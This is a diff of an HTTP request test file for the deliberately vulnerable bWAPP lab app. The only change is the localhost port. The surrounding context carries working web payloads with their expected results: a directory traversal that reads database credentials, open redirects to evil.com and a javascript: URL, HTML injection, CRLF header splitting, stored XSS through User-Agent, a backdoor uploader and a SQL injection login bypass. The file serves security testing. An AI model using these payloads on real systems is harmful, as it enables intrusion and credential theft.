@@ -15,7 +15,7 @@
 ###   This is why AUTH-02..04 in 06-auth-session.http need no brute force.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/admin/ HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 ### Expected: 200 WITHOUT any session cookie, body contains "bee/bug"
 
 
@@ -25,7 +25,7 @@ Host: localhost:8080
 ###   so even a patched /admin/ page would not remove the exposure.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/directory_traversal_1.php?page=admin/settings.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200, plaintext $db_username / $login / $password / $AIM_IPs
 
@@ -38,7 +38,7 @@ Cookie: {{authCookie}}
 ###   bugs are reachable (e.g. whether disable_functions blocks exec).
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/phpinfo.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200, ~80 KB, starts with "PHP Version 5.5.9-1ubuntu4.14"
 
@@ -51,7 +51,7 @@ Cookie: {{authCookie}}
 ###   failing expression.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/does_not_exist.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 ### Expected: 404 from Apache (routing), but any real PHP error returns a
 ###           stack trace. Compare with the SQL error in XXI-03.
 
@@ -62,7 +62,7 @@ Host: localhost:8080
 ###   full contents - including uploads (see UPL-01) and any backup files.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/images/ HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 ### Expected: 200, body contains "Index of /images" and a file listing
 ###           (this is also how an attacker finds the webshell from UPL-01)
 
@@ -71,7 +71,7 @@ Host: localhost:8080
 ### INFO-06  robots.txt
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/robots.txt HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 ### Expected: 200, the file's contents - note what it disallows
 
 
@@ -113,13 +113,13 @@ email=attacker%40evil.com&action=reset
 ###   and watch the same SQLi from 01-sqli.http still succeed.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/security_level_check.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200, reports the current level
 ###
 ### INFO-18  The same page while claiming to be hardened
 GET {{baseUrl}}/security_level_check.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: PHPSESSID={{session}}; security_level=2
 ### Expected: 200, reports "high" - but the app's only input here is our cookie
 
@@ -132,7 +132,7 @@ Cookie: PHPSESSID={{session}}; security_level=2
 ###   Watch the Location response header, do NOT follow it.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/unvalidated_redir_fwd_1.php?url=https%3A%2F%2Fevil.com&form=submit HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: PHPSESSID={{session}}; security_level=0
 ### Expected: 302, Location: https://evil.com
 
@@ -143,7 +143,7 @@ Cookie: PHPSESSID={{session}}; security_level=0
 ###   independent fixes, and a fix on one is easy to miss on the other.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/unvalidated_redir_fwd_2.php?ReturnUrl=https%3A%2F%2Fevil.com HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: PHPSESSID={{session}}; security_level=0
 ### Expected: 302, Location: https://evil.com
 
@@ -154,13 +154,13 @@ Cookie: PHPSESSID={{session}}; security_level=0
 ###   naive "must start with http" check.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/unvalidated_redir_fwd_2.php?ReturnUrl=//evil.com HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: PHPSESSID={{session}}; security_level=0
 ### Expected: 302, Location: //evil.com
 ###
 ### INFO-19  The javascript: pseudo-protocol
 GET {{baseUrl}}/unvalidated_redir_fwd_2.php?ReturnUrl=javascript%3Aalert(document.domain) HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: PHPSESSID={{session}}; security_level=0
 ### Expected: 302, Location: javascript:alert(document.domain)
 
@@ -171,7 +171,7 @@ Cookie: PHPSESSID={{session}}; security_level=0
 ###   get markup injection; combined with an event handler it is XSS.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/htmli_get.php?firstname=%3Ch1%3Einjected%3C%2Fh1%3E&lastname=x HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200, body contains a literal <h1>injected</h1>
 
@@ -183,7 +183,7 @@ Cookie: {{authCookie}}
 ###   Impact: cache poisoning, session fixation, and (on old stacks) XSS.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/http_response_splitting.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -197,7 +197,7 @@ ip=127.0.0.1%0d%0aX-Injected-Header%3A%20injected&form=submit
 ###   injectable. Send a payload as the User-Agent to confirm persistence.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/xss_stored_4.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 User-Agent: <script>alert("ua-stored")</script>
 ### Expected: 200, and the payload now sits in the visitors table
@@ -211,7 +211,7 @@ User-Agent: <script>alert("ua-stored")</script>
 ###   The uploadDir field lets you choose the destination directory.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/backdoor.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200, the "NSA file uploader" form with a `uploadDir` field
 ###           defaulting to /var/www/bWAPP/images
@@ -224,7 +224,7 @@ Cookie: {{authCookie}}
 ###   the negative keeps the report honest about what is actually broken.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/login.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Content-Type: application/x-www-form-urlencoded
 
 login=bee%27%20OR%20%271%27%3D%271%20--%20-&password=bug&security_level=0&form=submit
